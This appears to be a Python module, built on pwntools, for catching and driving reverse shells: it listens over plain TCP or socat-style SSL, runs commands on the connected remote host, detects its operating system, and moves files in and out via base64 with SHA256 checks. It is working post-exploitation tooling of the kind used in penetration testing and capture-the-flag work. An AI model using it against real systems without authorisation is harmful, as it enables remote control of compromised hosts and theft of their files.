
from pwn import listen, log
import os
import base64
import time
import re
import signal
import hashlib
import threading
import shlex
from typing import Optional, Tuple, Dict, Any

from exceptions import (
    ListenerStartError,
    ListenerStopError,
    FileUploadError,
    FileDownloadError,
    FileIntegrityError,
    OSDetectionError,
    CommandExecutionError
)


TOOLS_FOLDER = 'tools'
UPLOAD_FOLDER = 'uploads'

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DOWNLOAD_FOLDER = os.path.join(BASE_DIR, "downloads")


conn = None
server = None

def clean_ansi(text: str) -> str:
    """
    Remove ANSI escape codes and filter shell prompts from text.

    Args:
        text: Raw text containing ANSI codes and prompts

    Returns:
        Cleaned text with ANSI codes and prompts removed
    """
    ansi_escape = re.compile(r'\x1b(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])|\x07|\x0f|\x0e')
    cleaned = ansi_escape.sub('', text)
    prompt_pattern = re.compile(r'^\d+;[a-zA-Z0-9_-]+@[^:]+:.*$')

    filtered_lines = []
    for line in cleaned.split('\n'):
        if not prompt_pattern.match(line.strip()):
            filtered_lines.append(line.strip())

    return '\n'.join(filtered_lines)

def get_clean_response(cmd: str) -> Optional[str]:
    """
    Execute a command on the remote shell and return the cleaned response.

    Args:
        cmd: Command to execute

    Returns:
        Cleaned response text, or None if no valid response
    """
    conn.sendline(cmd.encode())
    conn.recvline(timeout=0.5)
    response = conn.recvline(timeout=2).decode(errors='ignore').strip()
    return clean_ansi(response) if response and response.lower() != cmd else None



def sigint_handler(signum: int, frame: Any) -> None:
    """
    Handle SIGINT signal (Ctrl+C) for graceful shutdown.

    Args:
        signum: Signal number
        frame: Current stack frame
    """
    if conn:
        conn.sendline(b'kill -2 $$')

def detect_remote_os() -> str:
    """
    Detect the operating system of the remote shell.

    Returns:
        OS name: "Linux", "Windows", or "Unknown"

    Raises:
        OSDetectionError: If OS detection fails critically
    """
    try:
        conn.sendline(b"uname")
        conn.recvline(timeout=0.5)
        output = clean_ansi(conn.recvrepeat(0.5).decode(errors='ignore').strip())

        if output and "linux" in output.lower():
            return "Linux"

        conn.sendline(b"ver")
        time.sleep(0.5)
        response = clean_ansi(conn.recvline(timeout=1).decode(errors='ignore').strip())

        if response and "Windows" in response:
            return "Windows"

        return "Unknown"
    except Exception as e:
        log.warning(f"Error detecting remote OS: {e}")
        raise OSDetectionError(f"Failed to detect remote OS: {e}") from e



def start_listener(port: int, mode: str = 'tcp') -> Tuple[Optional[Any], bool]:
    """
    Start a listener on the specified port and wait for connection.

    Args:
        port: Port number to listen on
        mode: 'tcp' for plain TCP, 'ssl' for socat-compatible SSL

    Returns:
        Tuple of (connection object, success status)

    Raises:
        ListenerStartError: If listener fails to start or bind to port
    """
    global conn, server
    try:
        if mode == 'ssl':
            return _start_ssl_listener(port)

        server = listen(port)
        log.success(f"Listening on port {port}...")
        conn = server.wait_for_connection()

        if conn:
            log.success(f"Connection received from {conn.rhost}")

            if threading.current_thread() is threading.main_thread():
                signal.signal(signal.SIGINT, sigint_handler)

            return conn, True

        return None, False
    except Exception as e:
        log.error(f"Failed to start listener on port {port}: {e}")
        raise ListenerStartError(f"Failed to start listener on port {port}: {e}") from e


def _start_ssl_listener(port: int) -> Tuple[Optional[Any], bool]:
    """Start an SSL/TLS listener compatible with socat OPENSSL connections."""
    import socket
    import ssl
    import tempfile
    global conn, server

    # Generate self-signed cert
    cert_dir = tempfile.mkdtemp()
    cert_file = os.path.join(cert_dir, 'shell.pem')
    key_file = os.path.join(cert_dir, 'shell.key')

    import subprocess
    subprocess.run([
        'openssl', 'req', '-newkey', 'rsa:2048', '-nodes',
        '-keyout', key_file, '-x509', '-days', '1',
        '-out', cert_file, '-subj', '/CN=localhost'
    ], capture_output=True, timeout=10)

    # Combine key + cert into PEM
    pem_file = os.path.join(cert_dir, 'combined.pem')
    with open(pem_file, 'w') as pem:
        with open(key_file) as k:
            pem.write(k.read())
        with open(cert_file) as c:
            pem.write(c.read())

    log.success(f"SSL cert generated, listening on port {port}...")

    # Create SSL-wrapped socket
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=pem_file, keyfile=key_file)

    raw_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    raw_server.bind(('0.0.0.0', port))
    raw_server.listen(1)

    ssl_server = context.wrap_socket(raw_server, server_side=True)
    server = ssl_server

    # Wait for connection
    client_socket, addr = ssl_server.accept()
    log.success(f"SSL connection received from {addr[0]}:{addr[1]}")

    # Wrap in a pwntools-compatible tube
    from pwn import remote
    # Use remote.fromsocket to get a tube from the raw SSL socket
    conn = remote.fromsocket(client_socket)
    conn.rhost = addr[0]

    if threading.current_thread() is threading.main_thread():
        signal.signal(signal.SIGINT, sigint_handler)

    return conn, True


def stop_listener() -> None:
    """
    Stop the active listener and close connections.

    Raises:
        ListenerStopError: If listener fails to stop cleanly
    """
    global conn, server
    if server:
        try:
            server.close()
            log.success("Listener stopped.")
        except Exception as e:
            log.error(f"Error stopping listener: {e}")
            raise ListenerStopError(f"Failed to stop listener: {e}") from e


def get_local_sha256(local_file: str) -> Optional[str]:
    """
    Calculate SHA256 hash of a local file.

    Args:
        local_file: Path to the local file

    Returns:
        SHA256 hash as hex string, or None if error
    """
    try:
        with open(local_file, 'rb') as f:
            return hashlib.sha256(f.read()).hexdigest()
    except Exception as e:
        log.warning(f"Error calculating local SHA256: {e}")
        return None

def get_remote_sha256(path: str) -> Optional[str]:
    """
    Calculate SHA256 hash of a remote file.

    Args:
        path: Path to the remote file

    Returns:
        SHA256 hash as hex string, or None if error
    """
    try:
        # Security: Properly escape the path
        escaped_path = shlex.quote(path)
        conn.sendline(f"sha256sum {escaped_path}".encode())
        conn.recvline(timeout=0.5)
        result = clean_ansi(conn.recvrepeat(1).decode(errors='ignore'))
        match = re.search(r'^([a-fA-F0-9]{64})', result)
        return match.group(1) if match else None
    except Exception as e:
        log.warning(f"Error calculating remote SHA256: {e}")
        return None

def send_command(cmd: str) -> Dict[str, Any]:
    """
    Send a command to the remote shell.

    Args:
        cmd: Command string to execute

    Returns:
        Dictionary with command results and metadata
    """
    if cmd.startswith("upload "):
        path = cmd.split(" ", 1)[1]
        upload_file(path)
        local_sha256 = get_local_sha256(path)
        remote_sha256 = get_remote_sha256(os.path.basename(path))

        return {
            "type": "file",
            "path": path,
            "local_hash": local_sha256,
            "remote_hash": remote_sha256,
            "success": local_sha256 == remote_sha256
        }

    elif cmd.startswith("download "):
        path = cmd.split(" ", 1)[1]
        local_hash, remote_hash = download_file(path)

        return {
            "type": "file",
            "path": path,
            "local_hash": local_hash,
            "remote_hash": remote_hash,
            "success": local_hash == remote_hash
        }

    # Normal command execution
    conn.sendline(cmd.encode())
    time.sleep(1)
    output = conn.recvrepeat(1).decode(errors='ignore').strip()
    return {"type": "output", "output": clean_ansi(output)}


def upload_file(file_path: str) -> None:
    """
    Upload a file to the remote shell using base64 encoding.

    Args:
        file_path: Path to the local file to upload

    Raises:
        FileUploadError: If file upload fails
        FileIntegrityError: If SHA256 verification fails
    """
    try:
        with open(file_path, "rb") as f:
            file_data = base64.b64encode(f.read()).decode()

        # Security: Properly escape filename
        remote_name = shlex.quote(os.path.basename(file_path))
        conn.sendline(f"echo {file_data} | base64 -d > {remote_name}".encode())
        log.info(f"Subiendo {file_path}")

        local_hash = get_local_sha256(file_path)
        remote_hash = get_remote_sha256(os.path.basename(file_path))

        if local_hash and remote_hash:
            log.info(f"\n[+] SHA256 local:  {local_hash}")
            log.info(f"[+] SHA256 remoto: {remote_hash}")

            if local_hash == remote_hash:
                log.success("✔️ Integridad verificada: los hashes coinciden.")
            else:
                log.warning("❌ Advertencia: los hashes NO coinciden. Puede haber corrupción en la transferencia.")
                raise FileIntegrityError(f"SHA256 mismatch for {file_path}: local={local_hash}, remote={remote_hash}")

    except FileIntegrityError:
        raise
    except Exception as e:
        log.error(f"Error al subir el archivo: {e}")
        raise FileUploadError(f"Failed to upload {file_path}: {e}") from e

def download_file(file_path: str) -> Tuple[Optional[str], Optional[str]]:
    """
    Download a file from the remote shell using base64 encoding.

    Args:
        file_path: Path to the remote file to download

    Returns:
        Tuple of (local_sha256, remote_sha256) or (None, None) on error

    Raises:
        FileDownloadError: If file download fails
        FileIntegrityError: If SHA256 verification fails
    """
    try:
        local_file = os.path.join(DOWNLOAD_FOLDER, os.path.basename(file_path))

        # Security: Properly escape path
        escaped_path = shlex.quote(file_path)
        conn.sendline(f"base64 {escaped_path}".encode())
        time.sleep(1)  # Le damos tiempo a la shell remota

        raw_data = conn.recvrepeat(3)  # Ajusta si necesitas más tiempo
        decoded_data = raw_data.decode(errors='ignore')

        # Extraemos solo la parte que parece base64 (omitimos prompts o basura ANSI)
        base64_lines = []
        for line in decoded_data.splitlines():
            if re.match(r'^[A-Za-z0-9+/=]+$', line.strip()):
                base64_lines.append(line.strip())

        file_data = ''.join(base64_lines)

        # Aseguramos padding
        missing_padding = len(file_data) % 4
        if missing_padding:
            file_data += '=' * (4 - missing_padding)

        with open(local_file, "wb") as f:
            f.write(base64.b64decode(file_data))

        log.success(f"Archivo {file_path} descargado.")
        local_hash = get_local_sha256(local_file)
        remote_hash = get_remote_sha256(file_path)

        if local_hash and remote_hash:
            log.info(f"[+] SHA256 local:  {local_hash}")
            log.info(f"[+] SHA256 remoto: {remote_hash}")

            if local_hash == remote_hash:
                log.success("✔️ Integridad verificada: los hashes coinciden.")
            else:
                log.warning("❌ Advertencia: los hashes NO coinciden. Puede haber corrupción en la transferencia.")
                raise FileIntegrityError(f"SHA256 mismatch for {file_path}: local={local_hash}, remote={remote_hash}")
        return local_hash, remote_hash

    except FileIntegrityError:
        raise
    except base64.binascii.Error as e:
        log.error(f"Error al decodificar Base64: {e}")
        raise FileDownloadError(f"Failed to decode base64 for {file_path}: {e}") from e
    except Exception as e:
        log.error(f"Error al descargar el archivo: {e}")
        raise FileDownloadError(f"Failed to download {file_path}: {e}") from e
